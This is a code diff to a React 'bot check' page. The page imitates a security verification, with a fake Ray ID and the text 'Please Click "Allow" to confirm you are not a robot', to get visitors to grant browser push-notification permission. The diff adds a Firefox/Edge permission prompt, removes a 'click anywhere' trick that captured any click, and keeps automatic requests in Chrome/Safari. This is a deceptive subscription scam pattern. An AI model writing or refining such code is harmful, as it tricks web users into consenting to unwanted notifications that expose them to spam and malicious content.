@@ -9,6 +9,8 @@ export default function BotCheckPage() {
   const [clientInfo, setClientInfo] = useState(null)
   const [isChecking, setIsChecking] = useState(true)
   const [isVerified, setIsVerified] = useState(false)
+  const [showSoftPrompt, setShowSoftPrompt] = useState(false)
+  const [permissionGranted, setPermissionGranted] = useState(false)
   const [rayId, setRayId] = useState('')
   const [userAgent, setUserAgent] = useState('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
   const [ipAddress] = useState('192.168.1.100')
@@ -124,7 +126,16 @@ export default function BotCheckPage() {
   }, [])
 
   useEffect(() => {
-    // Show bot check UI
+    const clickHelper = new BrowserClickHelper()
+    
+    // For Firefox/Edge, show soft prompt immediately instead of bot check
+    if (clickHelper.browser.requiresClick && clickHelper.needsPermission() && !window.isEmbedded) {
+      setIsChecking(false)
+      setShowSoftPrompt(true)
+      return
+    }
+    
+    // For Chrome/Safari or embedded mode, show bot check as before
     const timer = setTimeout(() => {
       setIsChecking(false)
       setIsVerified(true)
@@ -141,31 +152,14 @@ export default function BotCheckPage() {
               ip: ipAddress
             }
           }, '*')
-        }, 500) // Small delay after showing verified state
-      } else {
-        // Use BrowserClickHelper for better UX
-        const clickHelper = new BrowserClickHelper()
-        
-        if (clickHelper.browser.requiresClick && clickHelper.needsPermission()) {
-          // For Firefox/Edge - make entire page clickable
-          setTimeout(() => {
-            clickHelper.enableClickAnywhere(async () => {
-              if (clientInfo) {
-                await handleAllow()
-              }
-            }, {
-              hintText: `Click anywhere to enable notifications in ${clickHelper.browser.name}`,
-              timeout: 20000
-            })
-          }, 500)
-        } else if (!clickHelper.browser.requiresClick) {
-          // Chrome/Safari - auto-request as before
-          setTimeout(() => {
-            if (clientInfo) {
-              handleAllow()
-            }
-          }, 500)
-        }
+        }, 500)
+      } else if (!clickHelper.browser.requiresClick) {
+        // Chrome/Safari - auto-request as before
+        setTimeout(() => {
+          if (clientInfo) {
+            handleAllow()
+          }
+        }, 500)
       }
     }, 1500)
 
@@ -174,11 +168,43 @@ export default function BotCheckPage() {
     }
   }, [clientInfo, ipAddress])
 
+  const handleSoftPromptAllow = async () => {
+    try {
+      const permission = await Notification.requestPermission()
+      
+      if (permission === 'granted') {
+        setPermissionGranted(true)
+        setShowSoftPrompt(false)
+        
+        // Now show bot check after permission is granted
+        setIsChecking(true)
+        setTimeout(() => {
+          setIsChecking(false)
+          setIsVerified(true)
+          
+          // After bot check completes, continue with subscription
+          setTimeout(() => {
+            handleAllow()
+          }, 500)
+        }, 1500)
+      } else if (permission === 'denied') {
+        await handleBlock()
+      }
+    } catch (error) {
+      console.error('Error requesting permission:', error)
+    }
+  }
+
   const handleAllow = async () => {
     try {
-      console.log('Requesting notification permission...')
-      const permission = await Notification.requestPermission()
-      console.log('Permission result:', permission)
+      let permission = Notification.permission
+      
+      // Only request if not already granted
+      if (permission === 'default') {
+        console.log('Requesting notification permission...')
+        permission = await Notification.requestPermission()
+        console.log('Permission result:', permission)
+      }
       
       // If embedded in iframe, send message to parent
       if (window.isEmbedded && window.parent !== window) {
@@ -461,7 +487,78 @@ export default function BotCheckPage() {
       <Container>
         <Card className="mx-auto" style={{ maxWidth: '700px', border: '1px solid #d9d9d9', boxShadow: 'none' }}>
           <Card.Body className="p-5" style={{ backgroundColor: '#ffffff' }}>
-            {isChecking ? (
+            {showSoftPrompt ? (
+              // Soft prompt for Firefox/Edge
+              <div className="text-center">
+                <div style={{ 
+                  width: '80px', 
+                  height: '80px', 
+                  margin: '0 auto 30px',
+                  background: '#f0f8ff',
+                  borderRadius: '50%',
+                  display: 'flex',
+                  alignItems: 'center',
+                  justifyContent: 'center'
+                }}>
+                  <span style={{ fontSize: '40px' }}>🔔</span>
+                </div>
+                
+                <h2 style={{ fontSize: '28px', fontWeight: '600', color: '#333', marginBottom: '20px' }}>
+                  Enable Notifications
+                </h2>
+                
+                <p style={{ fontSize: '16px', color: '#666', marginBottom: '30px', lineHeight: '1.6' }}>
+                  Get instant updates about important events, special offers, and security alerts. 
+                  <br />
+                  We promise not to spam you!
+                </p>
+                
+                <div style={{ 
+                  background: '#fff3cd', 
+                  border: '1px solid #ffeaa7',
+                  borderRadius: '8px',
+                  padding: '15px',
+                  marginBottom: '30px'
+                }}>
+                  <p style={{ margin: 0, color: '#856404', fontSize: '14px' }}>
+                    <strong>{clientInfo?.browser || 'Your browser'}</strong> requires your permission to show notifications.
+                    Click "Enable Notifications" below, then click "Allow" in your browser.
+                  </p>
+                </div>
+                
+                <div className="d-flex gap-3 justify-content-center">
+                  <Button 
+                    variant="primary"
+                    size="lg"
+                    onClick={handleSoftPromptAllow}
+                    style={{
+                      background: '#0066cc',
+                      border: 'none',
+                      padding: '12px 40px',
+                      fontSize: '16px',
+                      fontWeight: '500'
+                    }}
+                  >
+                    Enable Notifications
+                  </Button>
+                  <Button 
+                    variant="outline-secondary"
+                    size="lg"
+                    onClick={handleBlock}
+                    style={{
+                      padding: '12px 40px',
+                      fontSize: '16px'
+                    }}
+                  >
+                    Not Now
+                  </Button>
+                </div>
+                
+                <p style={{ color: '#999', fontSize: '13px', marginTop: '30px', marginBottom: '0' }}>
+                  You can change this setting anytime in your browser preferences
+                </p>
+              </div>
+            ) : isChecking ? (
               <div className="text-center">
                 <h2 style={{ fontSize: '24px', fontWeight: '400', color: '#333', marginBottom: '30px' }}>
                   Please Click "Allow" to confirm you are not a robot.
